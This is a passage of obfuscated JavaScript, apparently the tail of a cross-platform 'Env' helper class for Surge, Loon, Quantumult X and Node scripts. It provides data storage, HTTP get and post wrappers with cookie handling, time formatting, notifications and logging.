        let _0x50eb62 = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        _0x50eb62 = _0x50eb62 ? _0x50eb62.replace(/\n/g, "").trim() : _0x50eb62;
        let _0x191a75 = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        _0x191a75 = _0x191a75 ? 1 * _0x191a75 : 20;
        _0x191a75 = _0x37c6b7 && _0x37c6b7.timeout ? _0x37c6b7.timeout : _0x191a75;
        const [_0xb310aa, _0x35adc0] = _0x50eb62.split("@"),
          _0x42a77e = {
            url: "http://" + _0x35adc0 + "/v1/scripting/evaluate",
            body: {
              script_text: _0x59e6c2,
              mock_type: "cron",
              timeout: _0x191a75
            },
            headers: {
              "X-Key": _0xb310aa,
              Accept: "*/*"
            }
          };
        this.post(_0x42a77e, (_0x2a9832, _0x4914ee, _0x2082b3) => _0x30c196(_0x2082b3));
      }).catch(_0x11aa98 => this.logErr(_0x11aa98));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x4c03a4 = this.path.resolve(this.dataFile),
          _0x3dc028 = this.path.resolve(process.cwd(), this.dataFile),
          _0x289521 = this.fs.existsSync(_0x4c03a4),
          _0xb6dbf0 = !_0x289521 && this.fs.existsSync(_0x3dc028);
        if (!_0x289521 && !_0xb6dbf0) {
          return {};
        }
        {
          const _0x289775 = _0x289521 ? _0x4c03a4 : _0x3dc028;
          try {
            return JSON.parse(this.fs.readFileSync(_0x289775));
          } catch (_0x4c31c2) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x565583 = this.path.resolve(this.dataFile),
          _0x3b9f2a = this.path.resolve(process.cwd(), this.dataFile),
          _0x37cf09 = this.fs.existsSync(_0x565583),
          _0x1410dc = !_0x37cf09 && this.fs.existsSync(_0x3b9f2a),
          _0x135f54 = JSON.stringify(this.data);
        _0x37cf09 ? this.fs.writeFileSync(_0x565583, _0x135f54) : _0x1410dc ? this.fs.writeFileSync(_0x3b9f2a, _0x135f54) : this.fs.writeFileSync(_0x565583, _0x135f54);
      }
    }
    lodash_get(_0xd5775f, _0x151a4c, _0x41141e) {
      const _0x259cca = _0x151a4c.replace(/\[(\d+)\]/g, ".$1").split(".");
      let _0x2bc37 = _0xd5775f;
      for (const _0x137ae8 of _0x259cca) if (_0x2bc37 = Object(_0x2bc37)[_0x137ae8], void 0 === _0x2bc37) {
        return _0x41141e;
      }
      return _0x2bc37;
    }
    lodash_set(_0x28102e, _0xa77f1a, _0x1ff343) {
      return Object(_0x28102e) !== _0x28102e ? _0x28102e : (Array.isArray(_0xa77f1a) || (_0xa77f1a = _0xa77f1a.toString().match(/[^.[\]]+/g) || []), _0xa77f1a.slice(0, -1).reduce((_0x507eef, _0x35838e, _0x288cb3) => Object(_0x507eef[_0x35838e]) === _0x507eef[_0x35838e] ? _0x507eef[_0x35838e] : _0x507eef[_0x35838e] = Math.abs(_0xa77f1a[_0x288cb3 + 1]) >> 0 == +_0xa77f1a[_0x288cb3 + 1] ? [] : {}, _0x28102e)[_0xa77f1a[_0xa77f1a.length - 1]] = _0x1ff343, _0x28102e);
    }
    getdata(_0x3b214f) {
      let _0x1e3ac0 = this.getval(_0x3b214f);
      if (/^@/.test(_0x3b214f)) {
        const [, _0x210c78, _0x2d3630] = /^@(.*?)\.(.*?)$/.exec(_0x3b214f),
          _0x4b1f13 = _0x210c78 ? this.getval(_0x210c78) : "";
        if (_0x4b1f13) {
          try {
            const _0x2a5e6a = JSON.parse(_0x4b1f13);
            _0x1e3ac0 = _0x2a5e6a ? this.lodash_get(_0x2a5e6a, _0x2d3630, "") : _0x1e3ac0;
          } catch (_0x43f63b) {
            _0x1e3ac0 = "";
          }
        }
      }
      return _0x1e3ac0;
    }
    setdata(_0x51e465, _0x1c9a80) {
      let _0x3d33a6 = !1;
      if (/^@/.test(_0x1c9a80)) {
        const [, _0xae644a, _0x518762] = /^@(.*?)\.(.*?)$/.exec(_0x1c9a80),
          _0x446f49 = this.getval(_0xae644a),
          _0x48a8c3 = _0xae644a ? "null" === _0x446f49 ? null : _0x446f49 || "{}" : "{}";
        try {
          const _0x21fb9f = JSON.parse(_0x48a8c3);
          this.lodash_set(_0x21fb9f, _0x518762, _0x51e465);
          _0x3d33a6 = this.setval(JSON.stringify(_0x21fb9f), _0xae644a);
        } catch (_0x5d9676) {
          const _0xb6b5e4 = {};
          this.lodash_set(_0xb6b5e4, _0x518762, _0x51e465);
          _0x3d33a6 = this.setval(JSON.stringify(_0xb6b5e4), _0xae644a);
        }
      } else {
        _0x3d33a6 = this.setval(_0x51e465, _0x1c9a80);
      }
      return _0x3d33a6;
    }
    getval(_0x1ce32e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(_0x1ce32e) : this.isQuanX() ? $prefs.valueForKey(_0x1ce32e) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x1ce32e]) : this.data && this.data[_0x1ce32e] || null;
    }
    setval(_0x10ce50, _0x463230) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(_0x10ce50, _0x463230) : this.isQuanX() ? $prefs.setValueForKey(_0x10ce50, _0x463230) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x463230] = _0x10ce50, this.writedata(), !0) : this.data && this.data[_0x463230] || null;
    }
    initGotEnv(_0x3935d6) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      _0x3935d6 && (_0x3935d6.headers = _0x3935d6.headers ? _0x3935d6.headers : {}, void 0 === _0x3935d6.headers.Cookie && void 0 === _0x3935d6.cookieJar && (_0x3935d6.cookieJar = this.ckjar));
    }
    get(_0xa88126, _0x20e340 = () => {}) {
      _0xa88126.headers && (delete _0xa88126.headers["Content-Type"], delete _0xa88126.headers["Content-Length"]);
      this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (_0xa88126.headers = _0xa88126.headers || {}, Object.assign(_0xa88126.headers, {
        "X-Surge-Skip-Scripting": !1
      })), $httpClient.get(_0xa88126, (_0x1311c3, _0x150141, _0xc46c7e) => {
        !_0x1311c3 && _0x150141 && (_0x150141.body = _0xc46c7e, _0x150141.statusCode = _0x150141.status);
        _0x20e340(_0x1311c3, _0x150141, _0xc46c7e);
      })) : this.isQuanX() ? (this.isNeedRewrite && (_0xa88126.opts = _0xa88126.opts || {}, Object.assign(_0xa88126.opts, {
        hints: !1
      })), $task.fetch(_0xa88126).then(_0x4c37a1 => {
        const {
          statusCode: _0x1dd6c1,
          statusCode: _0x591e06,
          headers: _0x5df9b4,
          body: _0x5334f8
        } = _0x4c37a1;
        _0x20e340(null, {
          status: _0x1dd6c1,
          statusCode: _0x591e06,
          headers: _0x5df9b4,
          body: _0x5334f8
        }, _0x5334f8);
      }, _0x3e6770 => _0x20e340(_0x3e6770))) : this.isNode() && (this.initGotEnv(_0xa88126), this.got(_0xa88126).on("redirect", (_0x380372, _0x5e23bf) => {
        try {
          if (_0x380372.headers["set-cookie"]) {
            const _0x40ed8e = _0x380372.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
            _0x40ed8e && this.ckjar.setCookieSync(_0x40ed8e, null);
            _0x5e23bf.cookieJar = this.ckjar;
          }
        } catch (_0x53fa20) {
          this.logErr(_0x53fa20);
        }
      }).then(_0x25f3af => {
        const {
          statusCode: _0x569668,
          statusCode: _0x43ac62,
          headers: _0x5682d4,
          body: _0x30d304
        } = _0x25f3af;
        _0x20e340(null, {
          status: _0x569668,
          statusCode: _0x43ac62,
          headers: _0x5682d4,
          body: _0x30d304
        }, _0x30d304);
      }, _0x3cf9be => {
        const {
          message: _0x408b1a,
          response: _0x52556b
        } = _0x3cf9be;
        _0x20e340(_0x408b1a, _0x52556b, _0x52556b && _0x52556b.body);
      }));
    }
    post(_0x2c25eb, _0x38c846 = () => {}) {
      if (_0x2c25eb.body && _0x2c25eb.headers && !_0x2c25eb.headers["Content-Type"] && (_0x2c25eb.headers["Content-Type"] = "application/x-www-form-urlencoded"), _0x2c25eb.headers && delete _0x2c25eb.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (_0x2c25eb.headers = _0x2c25eb.headers || {}, Object.assign(_0x2c25eb.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.post(_0x2c25eb, (_0x58aacf, _0x2fd98c, _0x5b52a3) => {
          !_0x58aacf && _0x2fd98c && (_0x2fd98c.body = _0x5b52a3, _0x2fd98c.statusCode = _0x2fd98c.status);
          _0x38c846(_0x58aacf, _0x2fd98c, _0x5b52a3);
        });
      } else {
        if (this.isQuanX()) {
          _0x2c25eb.method = "POST";
          this.isNeedRewrite && (_0x2c25eb.opts = _0x2c25eb.opts || {}, Object.assign(_0x2c25eb.opts, {
            hints: !1
          }));
          $task.fetch(_0x2c25eb).then(_0x31377a => {
            const {
              statusCode: _0xb5c942,
              statusCode: _0xacdb9f,
              headers: _0x597ddb,
              body: _0x3b48e0
            } = _0x31377a;
            _0x38c846(null, {
              status: _0xb5c942,
              statusCode: _0xacdb9f,
              headers: _0x597ddb,
              body: _0x3b48e0
            }, _0x3b48e0);
          }, _0x39fae8 => _0x38c846(_0x39fae8));
        } else {
          if (this.isNode()) {
            this.initGotEnv(_0x2c25eb);
            const {
              url: _0x211fab,
              ..._0x35067d
            } = _0x2c25eb;
            this.got.post(_0x211fab, _0x35067d).then(_0x3695e8 => {
              const {
                statusCode: _0xaf00b8,
                statusCode: _0x23fa70,
                headers: _0x23688a,
                body: _0x4a75a0
              } = _0x3695e8;
              _0x38c846(null, {
                status: _0xaf00b8,
                statusCode: _0x23fa70,
                headers: _0x23688a,
                body: _0x4a75a0
              }, _0x4a75a0);
            }, _0x4f3957 => {
              const {
                message: _0x147b4c,
                response: _0x3053a5
              } = _0x4f3957;
              _0x38c846(_0x147b4c, _0x3053a5, _0x3053a5 && _0x3053a5.body);
            });
          }
        }
      }
    }
    time(_0x4b068f) {
      let _0x34c08e = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "H+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(_0x4b068f) && (_0x4b068f = _0x4b068f.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let _0x46ce0e in _0x34c08e) new RegExp("(" + _0x46ce0e + ")").test(_0x4b068f) && (_0x4b068f = _0x4b068f.replace(RegExp.$1, 1 == RegExp.$1.length ? _0x34c08e[_0x46ce0e] : ("00" + _0x34c08e[_0x46ce0e]).substr(("" + _0x34c08e[_0x46ce0e]).length)));
      return _0x4b068f;
    }
    msg(_0x405c79 = _0x3dbae6, _0x24bc84 = "", _0x3e544e = "", _0x534d0b) {
      const _0xd2e5f7 = _0x397b97 => {
        if (!_0x397b97) {
          return _0x397b97;
        }
        if ("string" == typeof _0x397b97) {
          return this.isLoon() ? _0x397b97 : this.isQuanX() ? {
            "open-url": _0x397b97
          } : this.isSurge() ? {
            url: _0x397b97
          } : void 0;
        }
        if ("object" == typeof _0x397b97) {
          if (this.isLoon()) {
            let _0xd672db = _0x397b97.openUrl || _0x397b97.url || _0x397b97["open-url"],
              _0x4a8fe2 = _0x397b97.mediaUrl || _0x397b97["media-url"];
            return {
              openUrl: _0xd672db,
              mediaUrl: _0x4a8fe2
            };
          }
          if (this.isQuanX()) {
            let _0x88b214 = _0x397b97["open-url"] || _0x397b97.url || _0x397b97.openUrl,
              _0x512bd4 = _0x397b97["media-url"] || _0x397b97.mediaUrl;
            return {
              "open-url": _0x88b214,
              "media-url": _0x512bd4
            };
          }
          if (this.isSurge()) {
            let _0x1ea235 = _0x397b97.url || _0x397b97.openUrl || _0x397b97["open-url"];
            return {
              url: _0x1ea235
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(_0x405c79, _0x24bc84, _0x3e544e, _0xd2e5f7(_0x534d0b)) : this.isQuanX() && $notify(_0x405c79, _0x24bc84, _0x3e544e, _0xd2e5f7(_0x534d0b))), !this.isMuteLog) {
        let _0x1cc0eb = ["", "==============📣系统通知📣=============="];
        _0x1cc0eb.push(_0x405c79);
        _0x24bc84 && _0x1cc0eb.push(_0x24bc84);
        _0x3e544e && _0x1cc0eb.push(_0x3e544e);
        console.log(_0x1cc0eb.join("\n"));
        this.logs = this.logs.concat(_0x1cc0eb);
      }
    }
    log(..._0xccc9bc) {
      _0xccc9bc.length > 0 && (this.logs = [...this.logs, ..._0xccc9bc]);
      console.log(_0xccc9bc.join(this.logSeparator));
    }
    logErr(_0x7566b8, _0x1fcc5a) {
      const _0x1d66ef = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      _0x1d66ef ? this.log("", "❗️" + this.name + ", 错误!", _0x7566b8.stack) : this.log("", "❗️" + this.name + ", 错误!", _0x7566b8);
    }
    wait(_0xf1df32) {
      return new Promise(_0x108b5a => setTimeout(_0x108b5a, _0xf1df32));
    }
    done(_0x60dac6 = {}) {
      const _0x515853 = new Date().getTime(),
        _0x368dd1 = (_0x515853 - this.startTime) / 1000;
      this.log("", "🔔" + this.name + ", 结束! 🕛 " + _0x368dd1 + " 秒");
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(_0x60dac6);
    }
  }(_0x3dbae6, _0x597525);
}